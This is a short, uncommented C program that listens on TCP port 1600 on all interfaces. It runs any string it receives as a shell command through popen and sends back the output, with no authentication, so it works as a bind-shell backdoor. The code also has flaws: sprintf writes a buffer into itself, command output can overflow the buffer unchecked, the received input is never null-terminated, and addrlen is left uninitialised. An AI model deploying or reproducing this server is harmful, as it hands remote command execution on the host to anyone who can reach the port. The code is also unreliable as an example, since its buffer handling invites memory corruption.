
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h>

#define PORT (1600)

int pipe_cmd(char *cmd , char *buff)
{
FILE *fp;
char s[BUFSIZ];


	if(NULL == (fp = popen(cmd,"r"))) {
		perror("popen");
		return(-1);
	}
	while(NULL != fgets(s,BUFSIZ,fp)) {
		sprintf(buff,"%s%s",buff,s);
	}
	pclose(fp);
	return(0);
}

main()
{
int sd , sd_current , addrlen;
struct sockaddr_in sin , pin;
char cmd[BUFSIZ] , outbuff[BUFSIZ * 4];

	if(-1 == (sd = socket(AF_INET,SOCK_STREAM,0))) {
		perror("socket");
		exit(1);
	}
	bzero(&sin,sizeof(sin));
	sin.sin_family = AF_INET;
	sin.sin_addr.s_addr = INADDR_ANY;
	sin.sin_port = htons(PORT);

	if(-1 == (bind(sd,(struct sockaddr *)&sin,sizeof(sin)))) {
		perror("bind");
		exit(1);
	}
	
	if(-1 == listen(sd,5)) {
		perror("listen");
		exit(1);
	}

	while(1) {
	
	outbuff[0] ='\0';
	cmd[0] = '\0';

	if( -1 == (sd_current = accept(sd,(struct sockaddr *)&pin,&addrlen))) {
		perror("accept");
		exit(1);
	}

	if( -1 == recv(sd_current,cmd ,sizeof(cmd),0)) {
		perror("accept");
		exit(1);
	}

	/* execute command */
	if(pipe_cmd(cmd,outbuff)) {
		exit(1);
	}

	if( -1 == send(sd_current,outbuff,strlen(outbuff),0)) {
		perror("send");
		exit(1);
	}
	}
	
	close(sd);
	close(sd_current);
		
}
		
